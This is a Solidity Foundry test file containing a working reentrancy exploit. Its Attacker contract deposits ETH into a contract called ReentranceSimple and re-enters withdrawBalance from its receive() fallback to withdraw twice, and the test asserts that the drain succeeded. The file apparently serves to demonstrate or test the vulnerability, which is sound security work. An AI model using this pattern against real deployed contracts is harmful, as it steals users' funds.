
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ReentranceSimple} from "../src/ReentranceSimple.sol";

contract TestReentrancyReentranceSimple is Test {
    ReentranceSimple public reentranceSimple;
    
    Attacker public _attacker;

    function setUp() public {
        reentranceSimple = new ReentranceSimple();
        _attacker = new Attacker(address(reentranceSimple));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 1000 && attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state required other than funding.

        // --- 3. Funding ---
        // A. Fund the Victim (so it has ETH to steal)
        vm.deal(address(reentranceSimple), attackVal * 10); 
        
        // B. Fund the Attacker (redundancy)
        vm.deal(address(_attacker), attackVal * 2);

        // C. CRITICAL: Fund the Test Contract (address(this))
        vm.deal(address(this), attackVal * 10);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ReentranceSimple public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = ReentranceSimple(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedVal = val;
        
        // Deposit funds to establish a balance to withdraw
        victim.addToBalance{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        uint256 startBalance = address(this).balance;

        // 2. Store the value for the re-entrant call if needed.
        // (Already stored in setupAttack as storedVal, but val is passed here too)

        // 3. Call the vulnerable function.
        victim.withdrawBalance();

        // 4. Verify Success Conditions.
        uint256 endBalance = address(this).balance;
        
        // If we successfully re-entered, we should have withdrawn 'val' twice.
        // Therefore, endBalance should be roughly startBalance + (2 * val).
        // We check if we got more than a single withdrawal.
        if (endBalance > startBalance + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the contract
            victim.withdrawBalance();
        }
    }
}
